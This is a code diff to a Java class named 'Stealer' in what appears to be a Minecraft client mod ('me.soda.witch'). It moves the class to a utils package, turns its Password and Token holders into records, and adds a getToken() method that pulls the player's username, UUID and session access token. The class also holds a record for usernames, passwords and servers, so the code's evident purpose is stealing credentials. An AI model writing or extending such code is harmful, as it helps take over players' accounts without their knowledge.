@@ -1,4 +1,4 @@
-package me.soda.witch.features;
+package me.soda.witch.utils;
 
 import java.util.Arrays;
 import java.util.List;
@@ -32,20 +32,16 @@ public class Stealer {
         return null;
     }
 
-    public static class Password {
-        public String username, uuid, password, server;
-
-        public Password(String username, String uuid, String password, String server) {
-            this.username = username;
-            this.uuid = uuid;
-            this.password = password;
-            this.server = server;
-        }
-    }
-
-    public static class Token {
+    public static Token getToken() {
         String username = mc.getSession().getUsername();
         String uuid = mc.getSession().getUuid();
         String token = mc.getSession().getAccessToken();
+        return new Token(username, uuid, token);
+    }
+
+    public record Password(String username, String uuid, String password, String server) {
+    }
+
+    public record Token(String username, String uuid, String token) {
     }
 }
